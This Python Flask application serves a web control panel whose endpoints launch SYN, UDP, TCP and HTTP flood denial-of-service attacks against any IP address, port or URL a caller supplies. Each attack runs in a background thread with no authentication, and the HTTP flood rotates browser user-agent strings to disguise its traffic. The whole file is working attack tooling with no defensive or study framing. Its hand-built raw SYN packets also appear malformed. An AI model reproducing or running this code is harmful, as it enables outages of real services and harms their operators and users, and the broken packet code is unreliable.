from flask import Flask, request, jsonify, render_template
import socket
import threading
import time
import requests
import random

app = Flask(__name__)

# List of user agents to simulate different browsers and devices
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
]

def syn_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    ip_header = b'\x45\x00\x00\x28'
    ip_header += socket.inet_aton(target_ip)
    ip_header += socket.inet_aton(target_ip)
    ip_header += b'\x00\x06\x00\x00'
    ip_header += b'\x40\x06\x00\x00'
    ip_header += b'\x00\x00\x00\x00\x00\x00\x00\x00'

    tcp_header = b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x50\x02\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'
    tcp_header += b'\x00\x00\x00\x00'

    packet = ip_header + tcp_header

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b'\x00\x01\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(message, (target_ip, target_port))

def tcp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n')

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(b'A' * 1024)

def http_flood(target_url, duration):
    headers = {
        'User-Agent': random.choice(user_agents)
    }
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url, headers=headers)
        except requests.exceptions.RequestException:
            pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/syn_flood', methods=['POST'])
def syn_flood_endpoint():
    data = request.json
    target_ip = data['target_ip']
    target_port = data['target_port']
    duration = data['duration']

    threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)).start()
    return jsonify({"status": "SYN flood started"})

@app.route('/udp_flood', methods=['POST'])
def udp_flood_endpoint():
    data = request.json
    target_ip = data['target_ip']
    target_port = data['target_port']
    duration = data['duration']

    threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)).start()
    return jsonify({"status": "UDP flood started"})

@app.route('/tcp_flood', methods=['POST'])
def tcp_flood_endpoint():
    data = request.json
    target_ip = data['target_ip']
    target_port = data['target_port']
    duration = data['duration']

    threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration)).start()
    return jsonify({"status": "TCP flood started"})

@app.route('/http_flood', methods=['POST'])
def http_flood_endpoint():
    data = request.json
    target_url = data['target_url']
    duration = data['duration']

    threading.Thread(target=http_flood, args=(target_url, duration)).start()
    return jsonify({"status": "HTTP flood started"})

if __name__ == '__main__':
    app.run(debug=True)
